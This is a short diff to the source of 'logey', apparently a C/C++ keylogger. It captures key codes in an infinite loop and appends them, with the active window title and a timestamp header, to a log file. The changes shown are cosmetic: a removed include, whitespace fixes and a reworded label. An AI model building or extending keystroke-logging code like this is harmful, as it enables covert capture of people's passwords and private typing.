@@ -2,7 +2,6 @@
 //
 
 #include "logey.h"
-#include <time.h>
 
 int main() {
 
@@ -10,7 +9,7 @@ int main() {
 
 	createNewInstanceHeader("logey.log");
 	string logFile = "logey.log";
-  
+
 	while (true) // infinite loop
 	{
 		for (int i = 8; i <= 255; i++) {
@@ -40,7 +39,7 @@ void keys(int key, const char *filename) {
 
 	if (activeWindowTitle != windowTitle)
 	{
-		fprintf(OUTPUT_FILE, "\n\nWindow %s:\n\n", windowTitle);
+		fprintf(OUTPUT_FILE, "\n\nActive Window: %s\n\n", windowTitle);
 		activeWindowTitle = windowTitle;
 	}
 
@@ -176,7 +175,7 @@ char findLetter(int key) {
 
 void createNewInstanceHeader(char *filename) {
 	time_t currentTime;
-	time(&currentTime);	
+	time(&currentTime);
 
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(filename, "a+");
